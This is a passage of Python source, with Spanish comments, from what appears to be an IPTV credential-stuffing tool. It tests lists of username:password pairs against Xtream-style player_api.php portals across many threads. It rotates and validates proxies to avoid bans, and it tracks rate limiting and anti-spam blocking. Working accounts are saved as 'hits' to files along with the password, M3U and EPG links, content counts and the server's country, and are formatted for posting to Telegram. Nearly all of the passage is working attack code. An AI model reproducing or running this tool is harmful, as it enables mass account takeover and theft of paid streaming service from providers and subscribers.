                    result['is_xui'] = bool(data.get('server_info', {}).get('xui', False))
                    return result

                elif auth_int == 1:
                    logger.info(f"CUSTOM:  {user} - auth=1, status={status}")
                    result['status'] = 'custom'
                    result['user_info'] = user_info
                    result['is_xui'] = bool(data.get('server_info', {}).get('xui', False))
                    return result

                else:
                    logger.warning(f"FAIL: {user} - auth={auth_int} (valor inesperado)")
                    result['status'] = 'fail'
                    return result

            except (requests.exceptions. Timeout, 
                    requests.exceptions.ConnectTimeout,
                    requests.exceptions.ReadTimeout) as e:
                logger.warning(f"RETRY: {user} - Timeout: {type(e).__name__}")

                if proxy and proxy_manager. enabled:
                    proxy_manager.remove_proxy(proxy)

                result['status'] = 'retry'
                return result

            except requests.exceptions.ConnectionError as e:
                logger.warning(f"RETRY: {user} - Connection error")

                if proxy and proxy_manager.enabled:
                    proxy_manager.remove_proxy(proxy)

                result['status'] = 'retry'
                return result

            except Exception as e:
                logger.error(f"ERROR: {user} - Excepción inesperada:  {e}")

                retry_count += 1
                if retry_count > max_retries:
                    result['status'] = 'fail'
                    return result
                time.sleep(0.5)

        logger.info(f"FAIL:  {user} - Se agotaron reintentos")
        result['status'] = 'fail'
        return result

    def _test_proxy_immediate(self, proxy):
        """Test inmediato de proxy - falla rápido si está muerto"""
        if not proxy:
            return False

        try:

            response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxy,
                timeout=(1, 1),  
                verify=False
            )
            return response.status_code == 200
        except:
            return False

    def _get_working_proxy(self):
        """Obtiene un proxy que realmente funciona"""
        max_attempts = 2  
        attempts = 0

        while attempts < max_attempts:
            proxy = proxy_manager.get_proxy()

            if not proxy:
                return None

            if self._test_proxy_immediate(proxy):
                return proxy
            else:

                proxy_manager.remove_proxy(proxy)
                attempts += 1
                logger.debug(f"Proxy muerto detectado y removido: {proxy_manager._proxy_to_str(proxy)}")

        return None

    def _get_portal_verified_proxy(self):
        """Obtiene un proxy ya verificado contra el portal específico"""
        if not hasattr(self, 'portal_verified_proxies'):
            return self._get_verified_proxy()

        if hasattr(self, '_portal_proxy_cache') and self._portal_proxy_cache:
            current_time = time.time()

            expired = [k for k, v in self._portal_proxy_cache.items() 
                    if current_time - v['timestamp'] > 180]
            for key in expired:
                del self._portal_proxy_cache[key]

            if self._portal_proxy_cache:
                proxy_key = random.choice(list(self._portal_proxy_cache.keys()))
                return self._portal_proxy_cache[proxy_key]['proxy']

        return self._get_verified_proxy()

    def _get_verified_proxy(self):
        """Obtiene un proxy verificado con timeout para evitar bloqueos"""

        start_time = time.time()
        max_time = 5  

        if not hasattr(self, '_verified_proxy_cache'):
            self._verified_proxy_cache = {}

        current_time = time.time()

        expired_keys = [k for k, v in self._verified_proxy_cache.items() 
                    if current_time - v['timestamp'] > 60]
        for key in expired_keys:
            del self._verified_proxy_cache[key]

        cache_proxies = list(self._verified_proxy_cache.keys())
        if cache_proxies:
            cached_proxy_str = random.choice(cache_proxies)
            cached_proxy = self._verified_proxy_cache[cached_proxy_str]['proxy']
            return cached_proxy

        max_attempts = 2  
        for attempt in range(max_attempts):

            if time.time() - start_time > max_time:
                logger.warning("Timeout obteniendo proxy verificado")
                break

            proxy = proxy_manager.get_proxy()

            if not proxy:
                break

            if self._verify_proxy_ultra_fast_with_timeout(proxy, timeout=1.5):  

                proxy_str = proxy_manager._proxy_to_str(proxy)
                self._verified_proxy_cache[proxy_str] = {
                    'proxy': proxy,
                    'timestamp': current_time
                }
                return proxy
            else:
                proxy_manager.remove_proxy(proxy)

        return proxy_manager.get_proxy()

    def _verify_proxy_ultra_fast_with_timeout(self, proxy, timeout=2):
        """Verificación ultra rápida con timeout estricto"""
        if not proxy:
            return False

        try:
            response = requests.get(
                'http://icanhazip.com',
                proxies=proxy,
                timeout=(timeout/2, timeout),  
                verify=False,
                headers={'User-Agent': 'Mozilla/5.0'}
            )

            if response.status_code == 200:
                ip_text = response.text.strip()
                if '.' in ip_text and len(ip_text) > 7 and len(ip_text) < 20:
                    return True

            return False

        except:
            return False

    def _verify_proxy_ultra_fast(self, proxy):
        """Verificación ultra rápida de proxy - solo conectividad básica"""
        if not proxy:
            return False

        try:

            response = requests.get(
                'http://icanhazip.com',  
                proxies=proxy,
                timeout=(0.8, 1.2),  
                verify=False,
                headers={'User-Agent': 'Mozilla/5.0'}
            )

            if response.status_code == 200:
                ip_text = response.text.strip()

                if '.' in ip_text and len(ip_text) > 7 and len(ip_text) < 20:
                    return True

            return False

        except Exception as e:
            logger.debug(f"Verificación rápida falló: {e}")
            return False

    def _is_proxy_responsive(self, proxy):
        """Verifica rápidamente si un proxy está respondiendo"""
        if not proxy:
            return False

        try:

            test_response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxy,
                timeout=(1, 2),  
                verify=False
            )
            return test_response.status_code == 200
        except:
            return False

    def _quick_proxy_test(self, proxy):
        """Test rápido de proxy cada pocas solicitudes"""
        if not proxy:
            return False

        try:

            response = requests.get(
                'http://icanhazip.com',  
                proxies=proxy,
                timeout=(0.5, 1),  
                verify=False
            )
            return response.status_code == 200 and len(response.text.strip()) > 0
        except:
            return False

    def _detect_proxy_manipulation(self, response):
        """Verifica si un proxy podría estar manipulando las respuestas"""
        try:

            if len(response.text) < 20:
                return True

            if len(response.text) > 10000:
                return True

            if '<html' in response.text.lower() or '<body' in response.text.lower():
                return True

            if response.history:
                return True

            if 'proxy' in str(response.headers).lower():
                return True

            return False
        except:
            return False

    def _validate_hit_response(self, data, user):
        """Verifica que la respuesta sea un hit legítimo y no un falso positivo"""
        try:

            if not isinstance(data, dict):
                logger.debug(f"Validación fallida: respuesta no es un diccionario para {user}")
                return False

            if 'user_info' not in data:
                logger.debug(f"Validación fallida: falta user_info para {user}")
                return False

            user_info = data['user_info']

            if not isinstance(user_info, dict):
                logger.debug(f"Validación fallida: user_info no es un diccionario para {user}")
                return False

            if user_info.get('auth') != 1:
                logger.debug(f"Validación fallida: auth no es 1 para {user}, es {user_info.get('auth')}")
                return False

            status = user_info.get('status', '').lower()
            if status != 'active' and 'active' not in status:
                logger.debug(f"Validación fallida: status no es 'Active' para {user}, es {user_info.get('status')}")
                return False

            logger.debug(f"Validación exitosa: respuesta es un hit legítimo para {user}")
            return True

        except Exception as e:
            logger.debug(f"Error en validación de hit: {e} para {user}")
            return False

    def _record_response_code(self, domain, response_code):
        """Registra el código de respuesta para análisis de patrones"""
        base_domain = domain.split(':')[0]

        if base_domain not in self._response_history:
            self._response_history[base_domain] = []

        self._response_history[base_domain].append(response_code)

        if len(self._response_history[base_domain]) > 20:
            self._response_history[base_domain] = self._response_history[base_domain][-20:]

        if len(self._response_history[base_domain]) >= 5:
            if self._detect_anti_spam_protection(self._response_history[base_domain], base_domain):
                logger.info(f"Dominio {base_domain} marcado como protegido por anti-spam")

    def _is_proxy_error(self, exception):
        """Determina si un error es debido a un proxy malo (no a credenciales malas)"""
        proxy_error_types = (
            requests.exceptions.ProxyError,
            requests.exceptions.ConnectTimeout,
            requests.exceptions.ConnectionError,
            requests.exceptions.Timeout
        )

        proxy_error_messages = [
            'proxy', 'timed out', 'connection error', 
            'failed to establish connection', 'connection refused',
            'socks', 'tunnel connection failed'
        ]

        if isinstance(exception, proxy_error_types):
            return True

        error_msg = str(exception).lower()
        if any(msg in error_msg for msg in proxy_error_messages):
            return True

        return False

    def _process_retries(self):
        """Procesa los reintentos de manera optimizada"""
        if self.retry_queue.empty():
            return

        retry_size = self.retry_queue.qsize()
        logger.info(f"Procesando {retry_size} reintentos...")

        temp_retries = []

        while not self.retry_queue.empty():
            try:
                index = self.retry_queue.get(timeout=0.1)
                temp_retries.append(index)
                self.retry_queue.task_done()
            except queue.Empty:
                break

        logger.info(f"Se obtuvieron {len(temp_retries)} reintentos de la cola")

        print(f"\n{Colors.YELLOW}Procesando {len(temp_retries)} reintentos con sistema optimizado...{Colors.RESET}")

        max_retry_workers = min(50, len(temp_retries))

        def process_retry_worker(index):
            """Worker para procesar un reintento"""
            try:

                session = http_manager.create_session()

                if index >= len(self.combo_lines):
                    return None

                line = self.combo_lines[index]
                if ':' not in line:
                    return None

                user, password = line.split(':', 1)
                user = user.strip()
                password = password.strip()

                if self.credentials_processor:
                    user, password = self.credentials_processor(user, password)

                if proxy_manager.enabled:
                    proxy = proxy_manager.get_proxy()
                    result = self._check_account(session, user, password, proxy)

                    if result['status'] != 'retry':
                        session.close()
                        return result

                if proxy_manager.enabled:

                    proxy = proxy_manager.get_proxy()
                else:
                    proxy = None

                result = self._check_account(session, user, password, proxy)
                session.close()

                return result

            except Exception as e:
                logger.debug(f"Error procesando reintento {index}: {e}")
                return None

        successful = 0

        with ThreadPoolExecutor(max_workers=max_retry_workers) as executor:
            futures = [executor.submit(process_retry_worker, index) for index in temp_retries]

            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    self._process_retry_result(result)
                    successful += 1

        logger.info(f"Procesamiento de reintentos completado: {successful} procesados")
        print(f"\n{Colors.GREEN}Procesamiento de reintentos completado: {successful} procesados{Colors.RESET}")

    def _process_retry_result(self, result):
        """Procesa el resultado de un reintento"""
        with self.lock:
            if result['status'] == 'hit':
                self.stats['hits'] += 1
                self.stats['checked'] += 1
                self.stats['checked_this_session'] += 1
                self._process_hit(result)
            elif result['status'] == 'custom':
                self.stats['custom'] += 1
                self.stats['checked'] += 1
                self.stats['checked_this_session'] += 1
            elif result['status'] == 'fail':
                self.stats['fails'] += 1
                self.stats['checked'] += 1
                self.stats['checked_this_session'] += 1

    def _get_additional_info(self, session, user, password, proxy, result, custom_headers=None):
        """Obtiene información adicional optimizada para velocidad"""
        try:
            base_url = f"{self.protocol}://{self.portal}"

            is_special = self._check_special_domain(self.portal)
            is_rate_limited = self._is_rate_limited_domain(self.portal)

            headers_to_use = custom_headers if custom_headers else None

            if is_special and not headers_to_use:
                headers_to_use = {
                    'content-type': 'application/json; charset=UTF-8',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 9; ANE-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36',
                    'Host': self.portal,
                    'Connection': 'Keep-Alive',
                    'Accept-Encoding': 'gzip'
                }

            urls = {
                'live': f"{base_url}/player_api.php?username={user}&password={password}&action=get_live_streams",
                'vod': f"{base_url}/player_api.php?username={user}&password={password}&action=get_vod_streams",
                'series': f"{base_url}/player_api.php?username={user}&password={password}&action=get_series",
                'categories': f"{base_url}/player_api.php?username={user}&password={password}&action=get_live_categories"
            }

            total_content = 0
            has_categories = False

            timeout_per_request = 2 if is_rate_limited else 1

            priority_order = ['live', 'categories']

            for content_type in priority_order:
                url = urls[content_type]

                if is_rate_limited:
                    time.sleep(0.5)
                else:
                    time.sleep(0.2)

                try:
                    logger.debug(f"Solicitando {content_type}: {url}")
                    response = http_manager.make_request(
                        url, session, proxy, headers=headers_to_use, 
                        timeout=(timeout_per_request, timeout_per_request+1)
                    )

                    if response and response.status_code == 200:
                        try:
                            data = response.json()

                            if content_type == 'live':
                                if isinstance(data, list):
                                    count = len(data)
                                    result['live_count'] = count
                                    self.live_count = str(count)
                                    logger.debug(f"Canales en vivo encontrados: {count}")
                                    total_content += count

                            elif content_type == 'categories':
                                if isinstance(data, list) and len(data) > 0:
                                    has_categories = True
                                    self._process_categories_fast(data, result)

                        except Exception as e:
                            logger.debug(f"Error procesando datos de {content_type}: {e}")

                    elif response and response.status_code == 429:
                        logger.debug(f"Rate limiting detectado en solicitud de {content_type}")
                        if not self._is_rate_limited_domain(self.portal):
                            self._add_rate_limited_domain(self.portal)
                        time.sleep(1)

                except Exception as e:
                    logger.debug(f"Error al solicitar {content_type}: {e}")

            for content_type in ['vod', 'series']:
                url = urls[content_type]

                try:
                    time.sleep(0.2)
                    response = http_manager.make_request(
                        url, session, proxy, headers=headers_to_use,
                        timeout=(5, 20)
                    )

                    if response and response.status_code == 200:
                        try:
                            data = response.json()

                            if content_type == 'vod' and isinstance(data, list):
                                count = len(data)
                                result['vod_count'] = count
                                self.vod_count = str(count)
                                total_content += count
                                logger.debug(f"VOD encontrados: {count}")
                            elif content_type == 'series' and isinstance(data, list):
                                count = len(data)
                                result['series_count'] = count
                                self.series_count = str(count)
                                total_content += count
                                logger.debug(f"Series encontradas: {count}")
                        except:
                            pass
                except:
                    pass

            if total_content == 0 and not has_categories:
                logger.debug(f"ADVERTENCIA: Cuenta {user}:{password} sin contenido ni categorías")

                exp_date = result.get('user_info', {}).get('exp_date')
                if exp_date in [0, "0", "", None]:
                    logger.debug(f"Cuenta {user}:{password} marcada como potencial falso positivo")
                    result['potencial_falso_positivo'] = True

        except Exception as e:
            logger.error(f"Error obteniendo información adicional: {e}")

    def _process_categories_fast(self, categories_data, result):
        """Procesa categorías de forma optimizada para velocidad"""
        try:
            if not categories_data or not isinstance(categories_data, list):
                return

            logger.debug(f"Procesando {len(categories_data)} categorías")

            categories_text = ""
            for category in categories_data[:20]:  
                if 'category_name' in category:
                    name = category['category_name']

                    categories_text += f" 🔹{name}"

            result['categories'] = categories_text
            self.categories = categories_text
            logger.debug(f"Texto de categorías generado: {len(categories_text)} caracteres")

        except Exception as e:
            logger.error(f"Error procesando categorías: {e}")
            result['categories'] = ""
            self.categories = ""

    def _save_hit_to_file_formatted(self, formatted_output, user):
        """Guarda el hit con formato mejorado en archivo"""
        try:
            domain = self.portal.split(':')[0].replace(":", "_").replace(".", "_")

            if not os.path.exists('hits'):
                os.makedirs('hits')

            timestamp = datetime.now().strftime("%Y%m%d")
            filename = f"hits/HITS_{domain}_{timestamp}.txt"

            with open(filename, 'a', encoding='utf-8') as f:
                f.write(formatted_output)

            logger.info(f"Hit mejorado guardado en: {filename}")
            return True
        except Exception as e:
            logger.error(f"Error guardando hit mejorado: {e}")
            return False

    def _format_hit_output(self, nickn, panel, user, password, activeconnections, maxConnections, expiration, m3uURL, livelist="", envivo="?", peliculas="?", series="?"):
        """Genera el formato de salida usando tu estilo"""

        time_ = time.localtime()
        current_time = time.strftime("%Y-%m-%d -- %H:%M:%S", time_)

        country = "Desconocido"
        try:
            import socket
            from urllib.parse import urlparse

            ip = socket.gethostbyname(urlparse(panel).netloc.split(':')[0])
            urlGEOIP = f"http://ip-api.com/json/{ip}"
            response = requests.get(urlGEOIP, timeout=2, verify=False)
            if response.status_code == 200:
                data = response.json()
                if "country" in data:
                    country = f"{data['country']} {self._get_country_flag(data['countryCode'])}"
        except:
            pass

        is_trial = "Trial" if "trial" in user.lower() or "test" in user.lower() else "Not Trial"

        separator_line = "────────────────────────"
        width = 50

        output = f"""
    {separator_line}
                ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★ 
    {separator_line}
    ➥🆙 Active
    ➥🧪 {is_trial}
    ➥🌐 {panel}
    ➥👤 {user}
    ➥🔑 {password}
    ➥⏲ {expiration}
    ➥👁 {activeconnections} / {maxConnections}
    ➥📍 {country}
    {separator_line}
                    ★彡ᴄᴏɴᴛᴇɴᴛ彡★
    {separator_line}
    ➥📺 {envivo}
    ➥🎥 {peliculas}
    ➥📹 {series}

    ➥🔗M3U   |   EPG"""

        if livelist:
            output += f"""

    {separator_line}
                    ★彡ᴄᴀᴛᴇɢᴏʀíᴀs彡★
    {separator_line}
    {livelist}"""

        output += f"""

    {separator_line}
    {f"Hit por {nickn}".center(width)}
    {current_time.center(width)}"""

        return output

    def format_telegram_output(nickn, panel, user, password, activeconnections, maxConnections, expiration, m3uURL, livelist=""):
        """Genera salida específica para Telegram con enlaces clickeables."""

        output_text = format_hit_output(nickn, panel, user, password, activeconnections, maxConnections, expiration, m3uURL, livelist)

        panel_url = f"{self.protocol}://{self.portal}"
        m3u_url = f"{panel_url}/get.php?username={user}&password={password}&type=m3u_plus"

        panel = panel_url

        m3u_link = m3uURL
        epg_link = f"{panel}/xmltv.php?username={user}&password={password}"

        link_line = f"""➥🔗<a href="{m3u_link}">M3U</a>   |   <a href="{epg_link}">EPG</a>"""
        original_link_line = "➥🔗M3U   |   EPG"
        output_text = output_text.replace(original_link_line, link_line)

        return output_text

    def _worker_thread(self):
        """Worker thread optimizado con sistema de tracking corregido para evitar re-verificación"""
        session = http_manager.create_session()
        current_proxy = None
        last_proxy_change = 0
        proxy_change_interval = 2  
        request_count = 0
        max_requests_per_proxy = 1  
        consecutive_failures = 0
        max_consecutive_failures = 2
        thread_timeout = 15  

        thread_proxy_cache = []
        cache_refresh_time = 0
        cache_duration = 30  

        total_errors = 0
        max_total_errors = 50  

        thread_id = threading.current_thread().name
        logger.debug(f"Worker thread {thread_id} iniciado")

        timeout_cycles = 0

        while self.running:
            try:

                if hasattr(self, 'ip_banned') and self.ip_banned:
                    logger.debug(f"Thread {thread_id}: pausado - IP baneada")
                    time.sleep(2)
                    continue

                freeze_detector.record_activity(thread_id)

                is_retry = False
                index = None

                try:
                    index = self.task_queue.get(timeout=1.0)
                    is_retry = False
                    timeout_cycles = 0  
                except queue.Empty:

                    if not self.processing_retries:
                        try:
                            index = self.retry_queue.get(timeout=1.0)
                            is_retry = True
                            timeout_cycles = 0  
                        except queue.Empty:
                            if self.retries_processed:
                                logger.debug(f"Thread {thread_id} terminando - reintentos procesados")
                                break

                            timeout_cycles += 1
                            if timeout_cycles > 30:  
                                logger.warning(f"Thread {thread_id} terminando por timeout - sin trabajo por 30s")
                                break
                            time.sleep(0.1)
                            continue
                    else:

                        time.sleep(0.1)
                        continue

                if index is None or index >= len(self.combo_lines):
                    logger.debug(f"Thread {thread_id}: índice inválido {index}")
                    if is_retry:
                        self.retry_queue.task_done()
                    else:
                        self.task_queue.task_done()
                    continue

                line = self.combo_lines[index]
                if ':' not in line:
                    logger.debug(f"Thread {thread_id}: línea inválida en índice {index}")
                    if is_retry:
                        self.retry_queue.task_done()
                    else:
                        self.task_queue.task_done()
                    continue

                try:

                    user, password, host_from_line = self._parse_combo_line(line)

                    if host_from_line and (not self.portal or self.portal == ":80"):
                        self.portal = host_from_line
                        logger.info(f"Portal detectado del combo: {self.portal}")

                    if not user or not password:
                        logger.debug(f"Thread {thread_id}: credenciales vacías en índice {index}")
                        if is_retry:
                            self.retry_queue.task_done()
                        else:
                            self.task_queue.task_done()
                        continue

                    if self.credentials_processor:
                        user, password = self.credentials_processor(user, password)

                except Exception as e:
                    logger.debug(f"Thread {thread_id}: error parseando credenciales: {e}")
                    if is_retry:
                        self.retry_queue.task_done()
                    else:
                        self.task_queue.task_done()
                    continue

                if is_retry and self._is_account_verified(user, password):
                    logger.debug(f"Thread {thread_id}: cuenta {user} ya verificada, saltando retry")
                    self.retry_queue.task_done()
                    continue

                if proxy_manager.enabled:
                    current_time = time.time()

                    if current_time - cache_refresh_time > cache_duration or not thread_proxy_cache:
                        try:
                            thread_proxy_cache = proxy_manager.active_proxies[:50]  
                            cache_refresh_time = current_time
                            logger.debug(f"Thread {thread_id}: cache de proxies actualizado - {len(thread_proxy_cache)} proxies")
                        except Exception as e:
                            logger.debug(f"Thread {thread_id}: error actualizando cache de proxies: {e}")

                    should_change = (
                        current_proxy is None or
                        current_time - last_proxy_change >= proxy_change_interval or
                        request_count >= max_requests_per_proxy or
                        consecutive_failures >= max_consecutive_failures
                    )

                    if should_change:
                        try:

                            if thread_proxy_cache and random.random() < 0.7:

                                current_proxy = random.choice(thread_proxy_cache)
                                logger.debug(f"Thread {thread_id}: usando proxy del cache")
                            else:

                                current_proxy = proxy_manager.get_proxy()
                                logger.debug(f"Thread {thread_id}: obteniendo proxy fresco")

                            last_proxy_change = current_time
                            request_count = 0
                            consecutive_failures = 0

                            if current_proxy is None:
                                logger.warning(f"Thread {thread_id}: no hay proxies disponibles")
                        except Exception as e:
                            logger.debug(f"Thread {thread_id}: error obteniendo proxy: {e}")
                            current_proxy = None
                else:
                    current_proxy = None

                request_count += 1

                try:
                    with self.lock:
                        self.current_proxy = current_proxy
                        self.current_user = user
                        self.current_pass = password
                except Exception as e:
                    logger.debug(f"Thread {thread_id}: error actualizando display: {e}")

                start_request_time = time.time()
                result = None

                try:

                    result_container = [None]
                    exception_container = [None]
                    verification_completed = threading.Event()

                    def check_account_with_timeout():
                        try:
                            result_container[0] = self._check_account(session, user, password, current_proxy)
                        except Exception as e:
                            exception_container[0] = e
                        finally:
                            verification_completed.set()

                    check_thread = threading.Thread(target=check_account_with_timeout, daemon=True)
                    check_thread.start()

                    if verification_completed.wait(timeout=thread_timeout):

                        if exception_container[0]:
                            raise exception_container[0]
                        result = result_container[0]
                    else:

                        logger.warning(f"Thread {thread_id}: verificación bloqueada por {thread_timeout}s para {user}")

                        if current_proxy and proxy_manager.enabled:
                            proxy_manager.remove_proxy(current_proxy)
                            logger.debug(f"Thread {thread_id}: proxy removido por timeout")

                        result = {
                            'user': user,
                            'pass': password,
                            'status': 'retry',
                            'portal': self.portal,
                            'protocol': self.protocol
                        }

                        consecutive_failures = max_consecutive_failures  
                        total_errors += 1

                except Exception as e:
                    logger.debug(f"Thread {thread_id}: error en verificación para {user}: {e}")

                    if self._is_proxy_error(e):
                        logger.debug(f"Thread {thread_id}: error de proxy detectado")
                        if current_proxy and proxy_manager.enabled:
                            proxy_manager.remove_proxy(current_proxy)
                        consecutive_failures += 1
                    else:
                        logger.debug(f"Thread {thread_id}: error no relacionado con proxy")

                    result = {
                        'user': user,
                        'pass': password,
                        'status': 'retry',
                        'portal': self.portal,
                        'protocol': self.protocol
                    }

                    total_errors += 1

                if not result:
                    logger.debug(f"Thread {thread_id}: resultado nulo para {user}")
                    result = {
                        'user': user,
                        'pass': password,
                        'status': 'retry',
                        'portal': self.portal,
                        'protocol': self.protocol
                    }

                request_duration = time.time() - start_request_time

                if current_proxy and proxy_manager.enabled:
                    logger.debug(f"Worker thread usando proxy: {proxy_manager._proxy_to_str(current_proxy)}")
                    try:
                        if result['status'] in ['hit', 'custom', 'fail']:
                            consecutive_failures = 0
                            if request_duration < 5:
                                proxy_manager.report_proxy_success(current_proxy)
                        elif result['status'] == 'retry':
                            consecutive_failures += 1
                            if request_duration > 8:
                                proxy_manager.report_proxy_timeout(current_proxy, request_duration)
                    except Exception as e:
                        logger.debug(f"Thread {thread_id}: error reportando estado del proxy: {e}")

                try:
                    with self.lock:
                        if result['status'] == 'hit':
                            self.stats['hits'] += 1
                            self.stats['checked'] += 1
                            self.stats['checked_this_session'] += 1
                            self._mark_account_verified(user, password)  

                            try:
                                self._process_hit_complete_mod(result, session, current_proxy, user, password)
                            except Exception as e:
                                logger.error(f"Thread {thread_id}: error procesando hit completo: {e}")

                                try:
                                    self._process_hit(result, session, current_proxy)
                                except Exception as e2:
                                    logger.error(f"Thread {thread_id}: error en fallback de procesamiento: {e2}")

                        elif result['status'] == 'custom':
                            self.stats['custom'] += 1
                            self.stats['checked'] += 1
                            self.stats['checked_this_session'] += 1
                            self._mark_account_verified(user, password)  

                        elif result['status'] == 'fail':
                            self.stats['fails'] += 1
                            self.stats['checked'] += 1
                            self.stats['checked_this_session'] += 1
                            self._mark_account_verified(user, password)

                        elif result['status'] == 'retry':

                            if is_retry:

                                self.retry_stats['attempts'] += 1
                                logger.debug(f"Thread {thread_id}: retry falló para {user}, intento #{self.retry_stats['attempts']}")

                            if not self.processing_retries and self._mark_for_retry(user, password, index):

                                self.stats['retries'] += 1
                                self.retries_text += f"{user}:{password}\n"
                                logger.debug(f"Thread {thread_id}: {user} añadido a cola de retry (retries={self.stats['retries']}, checked NO incrementado)")
                            else:

                                self.stats['retries'] += 1
                                logger.debug(f"Thread {thread_id}: retry para {user} incrementado (retries={self.stats['retries']}, checked NO incrementado)")

                except Exception as e:
                    logger.error(f"Thread {thread_id}: error procesando resultado: {e}")

                try:
                    if is_retry:
                        self.retry_queue.task_done()
                    else:
                        self.task_queue.task_done()
                except Exception as e:
                    logger.debug(f"Thread {thread_id}: error marcando tarea como completada: {e}")

                if total_errors >= max_total_errors:
                    logger.warning(f"Thread {thread_id}: alcanzado límite de errores ({total_errors}/{max_total_errors})")

                    if not self._ask_user_to_continue_on_errors(thread_id, total_errors, max_total_errors):
                        logger.info(f"Thread {thread_id}: deteniendo por decisión del usuario")
                        self.running = False  
                        break
                    else:

                        total_errors = 0
                        logger.info(f"Thread {thread_id}: continuando - contador de errores reseteado")

            except Exception as e:
                logger.error(f"Thread {thread_id}: error crítico en loop principal: {e}")
                total_errors += 1

                if current_proxy and proxy_manager.enabled:
                    try:
                        consecutive_failures += 1
                        if consecutive_failures >= max_consecutive_failures:
                            proxy_manager.remove_proxy(current_proxy)
                            current_proxy = None
                    except Exception as proxy_error:
                        logger.debug(f"Thread {thread_id}: error limpiando proxy: {proxy_error}")

                try:
                    if 'is_retry' in locals() and is_retry:
                        self.retry_queue.task_done()
                    elif 'index' in locals():
                        self.task_queue.task_done()
                except Exception as task_error:
                    logger.debug(f"Thread {thread_id}: error completando tarea después de error: {task_error}")

                if total_errors >= max_total_errors:
                    logger.error(f"Thread {thread_id}: alcanzado límite de errores críticos ({total_errors}/{max_total_errors})")

                    if not self._ask_user_to_continue_on_errors(thread_id, total_errors, max_total_errors):
                        logger.info(f"Thread {thread_id}: deteniendo por decisión del usuario (errores críticos)")
                        self.running = False  
                        break
                    else:

                        total_errors = 0
                        logger.info(f"Thread {thread_id}: continuando después de errores críticos - contador reseteado")

                time.sleep(0.5)

        try:
            session.close()
            logger.debug(f"Thread {thread_id} terminado correctamente. Errores totales: {total_errors}")
        except Exception as e:
            logger.debug(f"Thread {thread_id}: error cerrando sesión: {e}")

    def _ask_user_to_continue_on_errors(self, thread_id, total_errors, max_errors):
        """Pregunta al usuario si desea continuar después de muchos errores"""
        with self.error_check_lock:

            if self.error_limit_reached:
                return self.user_wants_to_continue

            self.error_limit_reached = True

            print(f"\n{Colors.RED}{'='*70}{Colors.RESET}")
            print(f"{Colors.RED}{Colors.BOLD}⚠ ADVERTENCIA: DEMASIADOS ERRORES DE CONEXIÓN{Colors.RESET}")
            print(f"{Colors.RED}{'='*70}{Colors.RESET}")
            print(f"{Colors.YELLOW}Thread {thread_id}: Se han detectado {total_errors} errores de conexión.{Colors.RESET}")
            print(f"{Colors.YELLOW}Límite configurado: {max_errors} errores{Colors.RESET}\n")

            print(f"{Colors.CYAN}Posibles causas:{Colors.RESET}")
            print(f"  • Problemas de red o conexión inestable")
            print(f"  • Servidor IPTV caído o sobrecargado")
            print(f"  • Proxies no funcionales (si estás usando)")
            print(f"  • IP baneada temporalmente\n")

            print(f"{Colors.GREEN}Opciones:{Colors.RESET}")
            print(f"{Colors.WHITE}  [C] Continuar de todos modos{Colors.RESET}")
            print(f"{Colors.WHITE}  [D] Detener y guardar checkpoint{Colors.RESET}")
            print(f"\n{Colors.YELLOW}Si no respondes en 10 segundos, se CONTINUARÁ automáticamente.{Colors.RESET}\n")

            response = input_with_timeout(
                f"{Colors.GREEN}Tu decisión [C/D]: {Colors.RESET}",
                timeout=10,
                default_response="c"
            )

            if response.startswith('d'):
                print(f"\n{Colors.CYAN}Deteniendo verificación y guardando checkpoint...{Colors.RESET}")
                self.user_wants_to_continue = False
                self.save_checkpoint()
                print(f"{Colors.GREEN}✓ Checkpoint guardado. Puedes reanudar después.{Colors.RESET}\n")
                return False
            else:
                print(f"\n{Colors.GREEN}✓ Continuando con la verificación...{Colors.RESET}")
                print(f"{Colors.YELLOW}Nota: Los errores se seguirán contando por thread.{Colors.RESET}\n")
                self.user_wants_to_continue = True

                self.error_limit_reached = False
                return True

    def _print_cache_stats(self):
        """Imprime estadísticas del sistema de cache en la pantalla"""
        if hasattr(self, 'server_content_cache') and self.server_content_cache['live_count'] is not None:
            cache_age = time.time() - self.server_content_cache['cache_time']
            cache_status = f"Cache: {cache_age:.0f}s ago"
            return f"{Colors.GREEN}📋 {cache_status}{Colors.RESET}"
        return ""

    def _debug_country_detection(self, panel):
        """Función de debug para verificar la detección del país"""
        try:
            import socket
            from urllib.parse import urlparse

            if panel.startswith(("http://", "https://")):
                host = urlparse(panel).netloc.split(':')[0]
            else:
                host = panel.split(':')[0]

            print(f"\n{Colors.CYAN}=== DEBUG PAÍS ==={Colors.RESET}")
            print(f"Panel: {panel}")
            print(f"Host extraído: {host}")

            ip = socket.gethostbyname(host)
            print(f"IP resuelta: {ip}")

            urlGEOIP = f"http://ip-api.com/json/{ip}"
            response = requests.get(urlGEOIP, timeout=2, verify=False)
            print(f"Status API: {response.status_code}")

            if response.status_code == 200:
                data = response.json()
                print(f"Respuesta API: {data}")

                country_name = data.get('country', 'No encontrado')
                country_code = data.get('countryCode', 'No encontrado')
                print(f"País: {country_name}")
                print(f"Código: {country_code}")

                if country_code and country_code != 'No encontrado':
                    flag_emoji = self._get_country_flag(country_code)
                    print(f"Bandera: {flag_emoji}")
                    final_country = f"{country_name} {flag_emoji}"
                    print(f"Final: {final_country}")

            print(f"{Colors.CYAN}=== FIN DEBUG ==={Colors.RESET}\n")

        except Exception as e:
            print(f"Error en debug: {e}")

    def _debug_categories_display(self):
        """Función de depuración para verificar el estado de las categorías"""
        logger.debug(f"=== DEBUG CATEGORÍAS ===")
        logger.debug(f"self.categories existe: {hasattr(self, 'categories')}")
        logger.debug(f"self.categories valor: {repr(self.categories) if hasattr(self, 'categories') else 'NO EXISTE'}")
        logger.debug(f"self.get_categories: {self.get_categories}")
        logger.debug(f"hits actuales: {self.stats.get('hits', 0)}")
        logger.debug(f"========================")

    def _process_hit_complete_mod(self, hit_data, session, current_proxy, user, password):
        """Procesa un hit con los nuevos formatos mejorados"""
        try:
            logger.info(f"Procesando hit mejorado para: {user}")

            user_info = hit_data.get('user_info', {})

            expire = user_info.get('exp_date')
            expire_str = "No expira"
            if expire and expire != "null":
                try:
                    if str(expire).isdigit():
                        expire_str = datetime.fromtimestamp(int(expire)).strftime('%Y-%m-%d')
                    else:
                        expire_str = str(expire)
                except:
